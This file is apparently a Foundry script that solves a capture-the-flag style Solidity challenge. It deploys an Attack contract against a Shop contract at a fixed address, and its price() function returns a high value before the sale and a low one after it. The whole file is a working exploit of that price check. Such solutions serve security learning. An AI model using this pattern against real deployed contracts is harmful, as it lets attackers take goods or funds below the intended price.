// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Shop.sol";

contract ShopScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        Attack a = new Attack();
        a.a();

        vm.stopBroadcast();
    }
}

contract Attack {
    Shop target;

    constructor() {
        target = Shop(0xd17449Cc7b5A2aee93fCd2c732a528bDa00e112C);
    }

    function a() public {
        target.buy();
    }

    function price() external view returns (uint256) {

        if (!target.isSold()) {
            return 100;
        } else {
            return 1;
        }
    }
}